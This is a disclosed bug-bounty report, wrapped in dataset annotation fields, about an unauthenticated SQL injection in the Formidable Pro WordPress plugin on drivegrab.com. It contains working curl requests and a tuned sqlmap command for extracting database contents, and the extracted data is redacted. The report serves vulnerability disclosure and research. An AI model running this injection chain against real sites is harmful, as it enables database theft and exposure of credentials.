{
  "reported_to": "Grab",
  "reported_by": "jouko ",
  "title": "www.drivegrab.com SQL injection",
  "content": "\nSummary:\nThe website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code.\nDescription:\nThe plugin allows the site admin to create forms to be filled by users. For this end it implements some AJAX functions, including one to preview (or actually just view) a form. The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users.\nThe preview function accepts some parameters. Some of them allows the user to specify HTML and WordPress shortcodes (special WordPress markup) to be included with the preview. One of the shortcodes implemented by the Formidable Pro plugin contains an SQL injection vulnerability.\nBrowsers Verified In:\nN/A\nSteps To Reproduce:\nVerifying the AJAX preview function with the cURL tool:\nCode 96 Bytes\n1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'\nThis request shows a preset \"contact us\" form (if form id is not defined, you'll get the first form in the database).\nThe preview AJAX request accepts some parameters. For example you can define HTML to be shown after the form:\nCode 119 Bytes\n1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=hello world'\nYou see that \"hello world\" appears on the page after the \"Contact us\" form.\nThe HTML may contain WordPress shortcodes which are special markup in square brackets. There are shortcodes implemented by the WordPress core, and shortcodes implemented by plugins. Any of these can be included in the form preview.\nThe Formidable plugin implements several shortcodes. One of them is [display-frm-data] which displays data that people have entered in a form. It accepts a few parameters, e.g. the form id:\nCode 139 Bytes\n1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'\nIn the resulting HTML you see some form entries between \"XXX\" and \"YYY\".\nThe [display-frm-data] shortcode also accepts parameters \"order_by\" and \"order\" for sorting the entries. The \"order_by\" parameter can contain a field ID or list of them. The \"order\" parameter is supposed to contain \"ASC\" or \"DESC\" to indicate the sorting direction. These parameters can be used to carry out an SQL injection.\nExample:\nCode 169 Bytes\n1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'\nAlthough this example gives no meaningful output, you should see in the server logs that the \"zzz\" went in an SQL query which produced an error message.\nThe shortcode parameters are processed in various ways which makes it very complicated to perform a successful SQL query and retrieve data. However it is possible.\nThe injected code goes in the ORDER BY clause of an intermediate query that retrieves the list of form entry ID's. Results of the manipulated query aren't directly visible. The attacker can control the order of entries appearing on the page, which is enough to communicate one bit of data from the database.\nA further complication is that any comma symbols in the injected data are specially treated and affect the resulting SQL query in a way that creates errors. With careful formatting, however, the query can be salvaged.\nI came up with the following sqlmap options to retrieve any data from the database:\nCode 456 Bytes\n1./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order=\"%2a( true=true )\"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(\",\",\",-it.id%2b\");order_by=\"id,\"*true.count(\",\")+\"id\"'  --test-filter DUAL --tamper commalesslimit -D \u2588\u2588\u2588\u2588\u2588 --sql-query \"SELECT \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 FROM \u2588\u2588\u2588\u2588\u2588 WHERE id=2\"\nThis works with the latest sqlmap. The \"commalesslimit\" tamper module helps avoiding comma symbols in any LIMIT clauses. The --eval parameter does some processing to repair queries that contain commas in the SELECT clause.\nSpecifically, for each comma appearing in the order parameter, the plugin appends \",it.id\" in the query. The repair code appends \"-it.id+\" after each comma to neutralize the effect. In other words, an injected \"SELECT a,b\" query would be translated to \"SELECT a,it.id b\" by the shortcode logic. The repair code changes it to \"SELECT a, it.id-it.id+b\" which evaluates to the original injected query.\nResult of the above sqlmap command:\nCode 479 Bytes\n1[03:09:30] [INFO] testing \u2588\u2588\u2588\u2588\u2588\n2[03:09:30] [INFO] confirming \u2588\u2588\u2588\u2588\u2588\u2588\n3[03:09:30] [INFO] the back-end DBMS is \u2588\u2588\u2588\n4web application technology: \u2588\u2588\u2588\u2588\u2588\n5back-end DBMS: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n6[03:09:30] [INFO] fetching SQL SELECT statement query output: 'SELECT \u2588\u2588\u2588\u2588\u2588\u2588\u2588 FROM \u2588\u2588\u2588\u2588 WHERE id=2'\n7[03:09:30] [INFO] retrieved: 1\n8[03:09:43] [INFO] retrieving the length of query output\n9[03:09:43] [INFO] \u2588\u2588\u2588\n10[03:10:46] [INFO] retrieved: \u2588\u2588\u2588\u2588\u2588             \n11SELECT \u2588\u2588\u2588\u2588\u2588\u2588 FROM \u2588\u2588\u2588\u2588 WHERE id=2 [1]:\n12[*] \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nSupporting Material/References:\nAs a proof of concept I retrieved some data.\nTables in the database:\nCode 809 Bytes\n1[\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588]\n2+---------------------------------+\n3| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588      |\n4| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588          |\n5| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588        |\n6| \u2588\u2588\u2588\u2588\u2588\u2588\u2588     |\n7| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 |\n8| \u2588\u2588\u2588\u2588\u2588\u2588\u2588         |\n9| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588      |\n10| \u2588\u2588\u2588\u2588 |\n11| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                |\n12| \u2588\u2588\u2588                   |\n13| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 |\n14| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                 |\n15| \u2588\u2588\u2588\u2588\u2588                  |\n16| \u2588\u2588\u2588             |\n17| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                  |\n18| \u2588\u2588\u2588\u2588\u2588\u2588\u2588 |\n19| \u2588\u2588\u2588\u2588\u2588\u2588\u2588         |\n20| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588       |\n21| \u2588\u2588\u2588\u2588             |\n22| \u2588\u2588\u2588\u2588\u2588                  |\n23| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 |\n24| \u2588\u2588\u2588                      |\n25| \u2588\u2588\u2588\u2588\u2588                    |\n26| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                   |\n27| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                      |\n28| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 |\n29| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588              |\n30| \u2588\u2588\u2588\u2588                   |\n31| \u2588\u2588\u2588\u2588\u2588\u2588                      |\n32| \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                   |\n33| \u2588\u2588\u2588\u2588\u2588\u2588                      |\n34+---------------------------------+\nAdministrator users and their password hashes:\nCode 46 Bytes\n1\u2588\u2588\u2588\u2588\u2588\n2\u2588\u2588\u2588\u2588\u2588\n3\u2588\u2588\u2588\u2588\u2588\u2588\n4\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5\u2588\u2588\u2588\n6\u2588\u2588\u2588\u2588\u2588\n7\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nWebroot path:\nCode 3 Bytes\n1\u2588\u2588\u2588\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 4500,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1510918080,
  "report_url": "https://hackerone.com/reports/273946",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Send a request to the AJAX endpoint with a basic form preview: curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'"
    ],
    [
      2,
      "Inject SQL via the 'display-frm-data' shortcode parameters: curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=\"zzz\"]YYY'"
    ],
    [
      3,
      "Use sqlmap with specialized parameters to bypass comma restrictions and extract data: ./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order=\"%2a( true=true )\"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(\",\",\",-it.id%2b\");order_by=\"id,\"*true.count(\",\")+\"id\"' --test-filter DUAL --tamper commalesslimit -D \u2588\u2588\u2588\u2588\u2588 --sql-query \"SELECT \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 FROM \u2588\u2588\u2588\u2588\u2588 WHERE id=2\""
    ]
  ],
  "vuln_description": "The vulnerability is an SQL injection in the Formidable Pro WordPress plugin, where unauthenticated users can exploit the 'display-frm-data' shortcode's order parameter to inject malicious SQL queries. The injection occurs in the ORDER BY clause of an intermediate query, allowing data extraction through careful manipulation of query parameters and bypassing comma restrictions.",
  "reason": "This vulnerability requires deep understanding of WordPress shortcodes, SQL injection techniques, and the plugin's specific handling of query parameters. The attacker must navigate multiple layers of parameter processing, develop custom SQL injection bypass techniques for comma restrictions, and use specialized tools like sqlmap with non-standard configurations to successfully exploit the flaw.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability involves unauthenticated access to an AJAX function in a WordPress plugin, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, which does not apply to this SQL injection vulnerability.",
    "is_detectable": false
  }
}